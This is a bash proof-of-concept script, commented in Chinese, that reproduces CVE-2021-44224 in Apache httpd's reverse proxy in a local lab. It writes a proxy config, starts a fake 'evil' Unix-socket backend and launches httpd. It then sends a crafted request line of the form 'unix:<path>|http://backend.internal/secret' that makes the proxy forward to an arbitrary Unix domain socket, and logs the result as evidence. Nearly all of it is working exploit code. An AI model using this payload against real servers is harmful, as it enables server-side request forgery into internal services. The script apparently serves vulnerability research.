#!/bin/bash
# 44224 更强 SSRF：worker 声明为普通 TCP (http://backend.internal/)，
# 攻击者用 unix:<任意路径>|http://backend.internal/... 让 forward 请求走任意 UDS。
set -u
ROOT="/mnt/e/强网拟态/cve/apache"
EVID="$ROOT/evidence/CVE-2021-44224"
PREFIX=/opt/httpd
EVIL=/tmp/cve-2021-44224-evil.sock
mkdir -p "$EVID" "$PREFIX/conf" "$PREFIX/htdocs" "$PREFIX/logs"
{
  sed -n '1,80p' "$ROOT/conf/httpd-44224.conf" | sed '/# 声明的 UDS 反向代理端点/,$d'
  cat <<'EOF'
# worker 声明为普通 TCP 后端（没有 UDS），验证任意 UDS 路径是否被接受
ProxyPass        "/reverse-tcp/" "http://backend.internal/"
ProxyPassReverse "/reverse-tcp/" "http://backend.internal/"
TypesConfig conf/mime.types
EOF
} > "$PREFIX/conf/httpd-44224-tcp.conf"
echo "== config tail =="; tail -8 "$PREFIX/conf/httpd-44224-tcp.conf"

pkill -f "$PREFIX/bin/httpd" 2>/dev/null || true
pkill -f 'uds_backend.py' 2>/dev/null || true
pkill -f 'evil_backend.py' 2>/dev/null || true
sleep 0.7
rm -f "$EVIL" "$EVID/evil_only.log"
sed "s#/tmp/cve-2021-44224.sock#$EVIL#g" "$ROOT/poc/CVE-2021-44224/uds_backend.py" > /tmp/evil_backend.py
python3 /tmp/evil_backend.py "$EVID/evil_only.log" &
P2=$!
for i in $(seq 1 40); do [ -S "$EVIL" ] && break; sleep 0.1; done
ls -l "$EVIL"

cd "$PREFIX"
"$PREFIX/bin/httpd" -f "$PREFIX/conf/httpd-44224-tcp.conf" -DFOREGROUND > "$EVID/console_evil_only.log" 2>&1 &
HPID=$!
for i in $(seq 1 40); do curl -s -o /dev/null http://127.0.0.1:8082/ && break; sleep 0.25; done

python3 - "$EVIL" > "$EVID/ssrf_arbitrary_uds.txt" 2>&1 <<'PY'
import socket, sys
uds = sys.argv[1]
req = ("GET unix:%s|http://backend.internal/secret HTTP/1.1\r\nHost: backend.internal\r\nConnection: close\r\n\r\n" % uds).encode()
s = socket.create_connection(("127.0.0.1", 8082), timeout=10)
s.sendall(req); s.shutdown(socket.SHUT_WR)
data=b""
try:
    while True:
        b=s.recv(65536)
        if not b: break
        data+=b
except Exception as e:
    print("recv exception", repr(e))
s.close()
print(data.decode("latin1"))
PY
echo "=== response ==="; head -15 "$EVID/ssrf_arbitrary_uds.txt"
echo "=== evil backend log ==="; cat "$EVID/evil_only.log"
echo "=== error log UDS lines ==="; grep -a -E 'determined UDS|connecting|has determined|UDS' /opt/httpd/logs/error_log | tail -8

kill "$HPID" 2>/dev/null || true
sleep 0.4
pkill -f "$PREFIX/bin/httpd" 2>/dev/null || true
kill "$P2" 2>/dev/null || true
rm -f "$EVIL"
